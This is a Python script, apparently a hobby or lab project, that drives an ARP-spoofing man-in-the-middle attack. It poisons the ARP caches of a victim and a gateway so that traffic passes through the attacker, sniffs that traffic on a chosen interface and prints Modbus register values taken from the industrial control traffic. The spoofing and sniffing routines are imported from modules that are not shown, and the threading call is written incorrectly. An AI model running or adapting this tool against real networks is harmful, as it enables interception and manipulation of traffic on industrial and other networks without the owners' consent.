# import file
from ARP_spoofing.spoof import * 
from ARP_spoofing.sniff import *

# import lib
import threading
from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import json

## arg parse sections
parser = argparse.ArgumentParser()

## spoof parameter
parser.add_argument('-IP-src', '--IP-src' , help='put the IP to spoof',type=str)
parser.add_argument('-IP-host', '--IP-host' , help='put the IP of the host',type=str)

## sniff parameter
#parser.add_argument('-iface', '--iface' , help='put the name of the interface',action="store_true")
parser.add_argument('-iface', '--iface' , help='put the name of the interface',type=str)

args = parser.parse_args()

#diplay the content of the json with the non default value
def diplay_json_file():
    with open("modbus.json","r+") as f:
        data = json.load(f)
        print("content sniffed (if nothing is outputed , that mean nothing whas sniffed)")
        for keys1 in data["Modbus"].keys():
            for keys2 in data["Modbus"][keys1].keys():
                #print("for loop :", keys2)
                for unit in data["Modbus"][keys1][keys2]:
                    uid = unit
                    unid_value = data["Modbus"][keys1][keys2][unit]
                    if unid_value != 0:
                        print( keys1 + ": " + uid + " = " +unid_value)



def main_spoof(target,host):
    # victim ip address
    target = args.IP_src
    # gateway ip address
    host = args.IP_host
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    #enable_ip_route()
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            #time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)


def main_sniff(iface_value):
    ## Setup sniff, filtering for IP traffic
    sniffed_packet = sniff(filter="ip", count=400000,iface=iface_value, prn=Protocol_Filter)
    #time.sleep(0.1)
    #print(sniffed_packet.summary(), flush=True)

if __name__ == "__main__":
    #test diplay json file
    diplay_json_file()

    # spoof parameter
    # victim ip address
    target_IP = args.IP_src
    # gateway ip address
    host_IP = args.IP_host
    # print progress to the screen
    verbose = True
    
    # sniff parameter
    iface_value = args.iface
    print("chk-1")

    main_sniff(iface_value)
    # make pulti trheading because otherwise arpspoofing whil block the executions of the script.
    thread1 = threading.Thread(target=main_spoof(target_IP,host_IP)) 
    thread1.start()


    
